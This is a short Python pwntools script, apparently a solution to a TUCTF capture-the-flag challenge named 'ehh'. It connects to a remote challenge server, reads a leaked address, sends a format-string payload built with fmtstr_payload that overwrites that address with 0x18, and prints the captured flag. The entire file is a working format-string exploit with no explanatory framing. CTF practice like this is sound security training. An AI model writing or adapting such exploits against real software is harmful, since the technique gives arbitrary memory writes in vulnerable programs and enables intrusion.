from pwn import *

flag_re = r'TUCTF{[a-zA-Z0-9_]+}'

context.clear(arch = 'i386')

addr_re = r'Input interesting text here< 0x([a-z0-9]+)'

# r = process('./ehh')
r = remote('18.222.213.102', 12345)

addr = int(re.search(addr_re, r.recvline()).group(1), 16)

payload = fmtstr_payload(6, {addr: 0x18}, numbwritten=0, write_size='int')

r.sendline(payload)

print re.search(flag_re, r.recvall()).group(0)
